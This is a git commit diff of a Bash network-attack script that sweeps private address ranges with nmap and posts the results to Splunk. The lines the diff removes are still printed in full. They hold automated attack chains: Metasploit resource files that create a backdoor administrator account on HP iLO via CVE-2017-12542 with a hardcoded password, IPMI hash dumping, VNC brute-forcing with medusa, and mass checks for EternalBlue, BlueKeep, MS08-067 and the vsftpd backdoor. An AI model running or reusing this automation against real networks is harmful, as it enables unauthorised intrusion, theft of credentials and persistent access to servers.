0d83d653f4222f4efd56ad4f5baddeda68dbdfea
Robert McCurdy <freeload101@users.noreply.github.com>
2024-03-13 07:57:46 -0400

    Update NMAP_FRUIT.sh

--- Bash/NMAP_FRUIT.sh
+++ Bash/NMAP_FRUIT.sh
@@ -1,12 +1,3 @@
-#20210713: added backup of *.csv ...
-#20210708: added 389 and 3269,636 to port list
-#2020/10/21: added more excludes to PORT_IP_LINUX.csv (FOR CS)
-#2020/10/20: backup old scan fils
-#2020/10/20: fixed PORT_IP_LINUX.csv format
-
-#2020/08/10: espaned top 40 to add apple ports 
-
-# backup old scan data
 export foldername=$(date +%Y%m%d)
 
 mkdir "${foldername}"
@@ -17,7 +8,7 @@ mv *.txt  "${foldername}"
 mv *.csv "${foldername}"
 
 
-export varNMAPFlags=' -v -T5  -sV -p 21-23,25,53,80-81,88,623,17990,17988,3283,110-111,113,135,139,143,179,199,363,389,443,445,465,514,548,554,587,636,993,995,1025-1026,1720,1723,2000,3268,3269,3306,3389,5060,5900,6001,8000,8080,8443,8888,9191,10000,32768,50000,7001  --open --randomize-hosts --defeat-rst-ratelimit  -O -sS -sV -sC '
+export varNMAPFlags=' -v -T5  -sV -p 21-23,25,53,80-81,88,623,17990,17988,3283,110-111,113,135,139,143,179,199,363,389,443,445,465,514,548,554,587,636,993,995,1025-1026,1720,1723,2000,3268,3269,3306,3389,5060,5900,6001,8000,8080,8443,8888,9191,10000,32768,50000,7001,135,515,1089,1090,1095,1099,1128,1128,1129,1129,2000,2001,2002,3298,3299,4239,4240,4241,4300,4363,4444,4445,4800,5001,5001,5002,5002,5050,5050,5514,6001,7200,7210,7269,7270,7575,8050,8051,8081,8200,8210,8220,8230,8351,8352,8353,8355,8357,8366,8444,9090,9090,9091,9091,9092,9092,9093,9093,9310,9786,9786,9999,10443,10514,20201,21212,21213,34443,40000,40001,40002,40006,40012,40014,44300,44400,50000,50001,50002,50003,50004,50005,50006,50007,50008,50010,50013,50013,50014,50014,50015,50017,50018,50019,50020,50021,50100,50101,50104,50116,59650,59651,59750,59751,59850,59851,59950,59951,59975,59976,62026,62027,62028,62029,62126,62127,62128,62129,3200-3299,3300-3999,40001-40079,40080-40099,4300-4399,8000-8099,8000-8099,8100-8199,8100-8199,3306,5432,1433,27017,6379,9042,3306,50000  --open --max-rtt-timeout 300ms --max-retries 1  --defeat-rst-ratelimit  -O -sS -sV -sC '
 
 sleep 10
 
@@ -27,15 +18,20 @@ echo `date` INFO: Starting 192.
 nmap ${varNMAPFlags} -oA 192 192.168.0.0/16
 
 # scan 10 and 172 just  1,2,3,10,20,30,100,254
+
+echo `date` INFO: Starting 192.
+nmap ${varNMAPFlags} -oA 192 192.168.0.0/16
+
 echo `date` INFO: Starting 172.
-nmap ${varNMAPFlags} -oA 172_GUESS 172.16-31.0-255.1,2,3,10,20,30,100,254
-grep open 172_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 172_NETWORKS
+nmap -T5 --max-rtt-timeout 300ms --max-retries 1  -sP -oA 172_GUESS 172.16-31.0-255.1,2,3,10,20,30,100,254
+grep Up 172_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u | shuf > 172_NETWORKS
 nmap ${varNMAPFlags} -oA 172_NETWORKS -iL 172_NETWORKS
 
 echo `date` INFO: Starting 10.
-nmap ${varNMAPFlags}  -oA 10_GUESS 10.0-255.0-255.1,254
-grep open 10_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 10_NETWORKS
+nmap -T5 --max-rtt-timeout 300ms --max-retries 1  -sP -oA 10_GUESS 10.0-255.0-255.1,254,10,20,30,40,50,60,70,80,90,100,110,120,130,140,150,160,170,180,190,200,210,220
+grep Up 10_GUESS.gnmap   | awk '{print $2}' | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u | shuf > 10_NETWORKS
 nmap ${varNMAPFlags} -oA 10_NETWORKS -iL 10_NETWORKS
+
 
 
 
@@ -68,12 +64,15 @@ cat *.gnmap | sort -u | grep -v Up | sed 's/,/ /g' |sed -r 's/Host: (.*) \((.*)\
 
 
 # clean /tmp
- 
+
 rm /tmp/*.csv
 
 # copy
 cp *.csv /tmp
 chmod 744 /tmp/*.csv
+
+
+
 
 echo "dumping to Splunk HEC1!!!"
 cd /apps/RMCCURDY/NMAP/XtremeNmapParser
@@ -86,166 +85,5 @@ python3 xnp.py -d ./ -M -R --open -C all
 
 sed -re 's/\{\"Hostname\"/\{ \"event\" : \{\"Hostname\"/g' -re 's/$/}/g' merged_nmap_scan_data.json -ibak
 
-curl -k https://http-inputs-xxxxxxxxxxxxxxx.splunkcloud.com/services/collector/event -H 'Authorization: Splunk 6adedXXXXXXXXXXXXXXXXXXXXXXXXXXccd1fb' -d @merged_nmap_scan_data.json
-
-
-echo `date` INFO: Running FRUIT path assumes you have ./metasploit/msfconsole ./changeme/changeme.py ./SAP_GW_RCE_exploit
-
-echo FRUIT!
-#iDRAC login check
-grep -iaE  "(Mbedthis|idrac)" *.gnmap | awk '{print $2}' | sort -u > idrac.txt
-
-cat <<EOF> idrac.rc
-use auxiliary/scanner/http/dell_idrac
-set THREADS 50
-set RHOSTS file:$PWD/idrac.txt
-run
-quit
-EOF
-
-msfconsole -r idrac.rc | tee SAUSE_idrac.txt
-
-cat SAUSE_idrac.txt | grep SUCC | sort -u | sed -r 's/.*https:\/\/(.*):.* user (.*)/\1,\2/g' >> SAUSE_ALL.csv
-
-#ms08067
-grep -E "(445\/open|137\/open)" *.gnmap | awk '{print $2}' | sort -u > ms08067.txt
-nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5 --script smb-vuln-ms08-067.nse -p445 -iL ms08067.txt -oA ms08067
-grep VULNERABLE ms08067.* | tee SAUSE_ms08067.txt
-grep -E "(Nmap scan r|VULNERABLE)"  ms08067.nmap|grep -B 1 "VULNERABLE:" | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,ms08067/g' >> SAUSE_ALL.csv
-
-
-# iLO
-
-grep -E "(iLO|Nmap scan)" *.nmap | grep -B 1 iLO | grep Nmap | awk '{print $5}' > ilo.txt
-
-cat <<EOF> hp_ilo_create_admin_account.rc
-use auxiliary/admin/hp/hp_ilo_create_admin_account
-set USERNAME robertmccurdy
-set PASSWORD NoxOnBoxOnSox
-set RHOSTS file:$PWD/ilo.txt
-run
-quit
-EOF
-
-msfconsole -r hp_ilo_create_admin_account.rc  |tee SAUSE_hp_ilo_create_admin_account.txt
-
-grep -E "(user already exists|created successfully|Running module against)" SAUSE_hp_ilo_create_admin_account.txt | grep -E "(user already exists|created successfully)" -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,CVE-2017-12542 iLO auth bypass/g' >> SAUSE_ALL.csv
-
-
-
-#IPMI hash dump 
-grep -iE "(Nmap scan|ipmi)" * | grep -B 1 -ia ipmi | grep "Nmap scan report" | awk '{print $5}' |  grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" > ipmihash.txt
-
-cat <<EOF> ipmihash.rc
-use auxiliary/scanner/ipmi/ipmi_dumphashes
-set THREADS 16
-set RHOSTS file:$PWD/ipmihash.txt
-run
-quit
-EOF
-
-msfconsole -r ipmihash.rc  |tee  SAUSE_ipmi_hash.txt
-
-grep 'Hash ' SAUSE_ipmi_hash.txt | sed 's/:/,/g' | sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >> SAUSE_ALL.csv
-
-
-#IPMI cipher zero
-grep -iE "(dropbear)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt
-nmap --open -p 623 --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -iL ipmi_cipher_zero.txt -oA ipmi_cipher_zero
-grep -E "(623\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt
-
-cat <<EOF> ipmihash.rc
-use auxiliary/scanner/ipmi/ipmi_cipher_zero
-set THREADS 16
-set RHOSTS file:$PWD/ipmi_cipher_zero.txt
-run
-quit
-EOF
-
-msfconsole -r ipmihash.rc |tee  SAUSE_ipmi_zero.txt
-
-grep VULNERABLE  SAUSE_ipmi_zero.txt |  sed 's/:623 - /,/g' |sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >>  SAUSE_ALL.csv
-
-
-# apc
-grep -Eia "(Nmap scan|power|apc)" *.nmap |grep -B 1 -Eia "(power|apc)" | grep Nmap | awk '{print $5}'|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > apc.txt
-
-echo 'for i in `cat apc.txt`' > apc.sh
-echo 'do ./changeme/changeme.py  $i &' >>apc.sh
-echo 'sleep 1' >> apc.sh
-echo 'done ' >> apc.sh
-
-bash apc.sh | tee apc_out.txt
-
-grep -ia '\-\-' -A 1 apc_out.txt |grep -v '\-\-'|grep -v read > SAUSE_APC.txt
-
-cat SAUSE_APC.txt | sed -r 's/.*\/\/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(.*)/\1,\2/g' >> SAUSE_ALL.csv
-
-
-
-#ms17-010
-grep -E "(445\/open)" *.gnmap| awk '{print $2}' | sort -u > ms17.txt
-nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script smb-vuln-ms17-010 -p445 -iL ms17.txt -oA ms17
-grep VULNERABLE ms17.* > SAUSE_ms17.txt
-grep -E "(Nmap scan|VULNERABLE)" ms17.nmap | grep VULNERABLE -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u | sed 's/$/,smb-vuln-ms17-010 EternalBlue/g' >> SAUSE_ALL.csv 
-
-
-#SAP check hot mess
-
-
-grep -Eia "(sap)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > SAP.txt
-nmap  --defeat-rst-ratelimit --max-retries 1 --min-parallelism 100  -p 3300 -iL SAP.txt -oA SAP -T5
-
-
-
-
-IFS=$'\n'
- 
-cd /apps/RMCCURDY/NMAP
-
-
-
-
-#  realvnc_41_bypass
-grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > realvnc_41_bypass.txt
-nmap --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script=realvnc-auth-bypass -p 5900 -iL realvnc_41_bypass.txt -oA realvnc_41_bypass
-grep -E "(VULNERABLE:|Nmap scan)" realvnc_41_bypass.nmap | grep -B 1 'VULNERABLE:' | grep 'Nmap scan' | awk '{print $5",bl4ck-vncviewer-authbypass"}' >> SAUSE_ALL.csv
-
-
-# rdpscan
-grep -E "(3389\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > rdpscan.txt
-./rdpscan/rdpscan --file rdpscan.txt --workers 10000 |tee rdpscan_out.txt
-grep VULNERABLE rdpscan_out.txt | sed 's/ - VULNERABLE - got appid/,rdpscan for CVE-2019-0708 bluekeep vuln/g' >> SAUSE_ALL.csv 
-
-#    vnc
-grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vnc.txt
-echo `date` DEBUG: Checking for defualt logins for VNC with medusa scanner
-medusa -M vnc -H vnc.txt -C  ./VNC/wordList_vnc.txt   -T 100 -L -f| tee SAUSE_VNC.txt
-grep FOUND SAUSE_VNC.txt  | sed 's/.*Host: //g' | sed 's/ User/,User/g' >> SAUSE_ALL.csv
-
-
-#vsftpd_234_backdoor
-grep -E "(21\/open)" *|grep -ia vsftp | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vsftpd_234_backdoor.txt
-nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -p 21 --script ftp-vsftpd-backdoor -iL vsftpd_234_backdoor.txt -oA vsftpd_234_backdoor   |tee SAUSE_vsftpd_234_backdoor.txt
-grep VULN vsftpd_234_backdoor.nmap >> SAUSE_ALL.csv
-
-
-# add sysvold admin hash check
-## Biszploit PIRA to get running
-## eyewitness RDP and VNC ?
-## webdump_burp ?
-## changeme
-#dir_webdav_unicode_bypass
-#multi/http/jenkins_script_console
-#open_x11 6000
-#cisco_smart_install
-#jboss_vulnscan
-#tomcat_mgr_login
-#hp_system_management
-#hp_sys_mgmt_exec
-#HP System Management - Anonymous Access Code Execution (Metasploit)
-#https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
-#
-#viem backup default
-#Symantec backup
+curl -k https://http-inputs-XXXXXXXXXXXXXXXXXXXXXXX.splunkcloud.com/services/collector/event -H 'Authorization: Splunk 6adedc7aXXXXXXXXXXXXXXXXccd1fb' -d @merged_nmap_scan_data.json
 
